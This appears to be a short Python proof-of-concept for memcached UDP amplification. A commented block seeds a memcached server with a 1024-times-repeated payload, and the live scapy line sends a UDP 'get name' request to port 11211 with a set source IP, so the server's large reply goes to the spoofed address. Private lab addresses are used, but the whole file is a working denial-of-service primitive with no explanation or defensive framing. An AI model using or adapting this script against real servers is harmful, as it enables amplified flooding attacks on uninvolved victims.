#import  memcache
#import  struct
import sys
from scapy.all import *
'''ip=input("IP:")
port=input("PORT:")
mc=memcache.Client([ip+":"+port],debug=True)
payload=input("PAYLOAD[P*1024]:")
mc.set("name",payload*1024)
ret=mc.get("name")
print(ret)
'''
data = "get name"
send(IP(src='192.168.199.104', dst='192.168.199.141')/UDP(sport=12345,dport=11211)/data)
